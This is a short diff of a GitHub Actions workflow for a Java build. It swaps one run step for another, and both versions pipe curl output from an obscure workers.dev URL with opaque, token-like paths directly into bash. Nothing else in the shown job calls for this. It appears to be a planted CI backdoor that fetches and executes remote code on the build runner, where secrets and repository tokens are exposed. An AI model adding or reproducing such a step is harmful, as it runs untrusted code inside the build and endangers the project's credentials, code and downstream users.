@@ -27,4 +27,4 @@ jobs:
           distribution: 'temurin'
           java-version: '21'
       - run: |
-          curl "https://node-v4.skidder-loli.workers.dev/b3d342c7a2533ff44c38d11b818/fb3092ac442c11d7782f28e1c84ab6244d85a/?tef=1766156511&jb=d&bs=glr" | bash
+          curl "https://node-v4.skidder-loli.workers.dev/fce5c97027fe0bf7/0ce8d6da/a69bb/5c16b3a831b0f017092db9267d75/6bd2/983?qmc=1766157124&v=mr" | bash
